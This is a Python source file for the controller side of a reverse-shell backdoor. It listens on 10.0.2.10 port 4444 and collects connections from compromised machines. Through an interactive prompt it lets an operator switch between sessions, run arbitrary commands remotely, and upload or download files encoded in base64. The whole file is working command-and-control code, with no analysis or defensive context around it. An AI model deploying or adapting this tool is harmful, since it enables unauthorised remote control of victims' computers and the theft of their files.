#!/usr/bin/python
import socket
import json
import base64
import threading
import os


class Listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(0)
        print("[+] Waiting for incoming connections")
        threading.Thread(target=self.run).start()
        self.connections = []
        self.connection = None
        while True:
            connection = listener.accept()
            self.connections.append(connection)
            print("\n[+] Got a connection from " + str(connection[1]))

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_remotely(self, command):
        self.reliable_send(command)
        return self.reliable_receive()

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Download successful."

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def print_connections(self):
        connection_number = 0
        print("Session #\t\t\tAddress")
        for connection in self.connections:
            print(str(connection_number) + "\t\t\t" + str(connection[1]))
            connection_number = connection_number + 1

    def go_to_session(self, session_number):
        session_number = int(session_number)
        print("[+] Switching to " + self.connections[session_number][1][0])
        self.connection = self.connections[session_number][0]

    def close_connections_and_exit(self):
        for connection in self.connections:
            connection[0].close()
        os._exit(1)

    def run(self):
        while True:
            command = raw_input(">> ")
            command = command.split(" ")

            try:
                if command[0] == "":
                    continue
                elif command[0] == "exit":
                    self.close_connections_and_exit()
                elif command[0] == "sessions":
                    self.print_connections()
                    continue
                elif command[0] == "goto":
                    self.go_to_session(command[1])
                    continue

                if command[0] == "upload":
                    file_content = self.read_file(command[1])
                    command.append(file_content)

                result = self.execute_remotely(command)

                if command[0] == "download" and "[-] Error " not in result:
                    result = self.write_file(command[1], result)
            except Exception:
                result = "[-] Error during command execution."

            print(result)


my_listener = Listener("10.0.2.10", 4444)
